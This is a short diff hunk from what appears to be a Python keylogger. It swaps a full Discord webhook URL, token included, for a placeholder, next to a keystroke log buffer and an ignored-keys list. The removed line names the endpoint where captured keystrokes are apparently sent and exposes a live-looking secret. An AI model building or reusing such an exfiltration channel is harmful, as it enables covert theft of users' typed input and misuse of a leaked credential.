@@ -7,7 +7,7 @@ log = ""
 log_lock = threading.Lock()
 
 # Your Discord webhook
-webhook_url = 'https://discord.com/api/webhooks/1377004037823529000/NalDhaoq5dXwB-qpproP7MJ7bIekjCVm4lv_HWsf1CivOPSty6veKH2ZGKlOIVs8cZ_8'
+webhook_url = 'your webhook'
 
 # List of keys to ignore
 ignored_keys = {
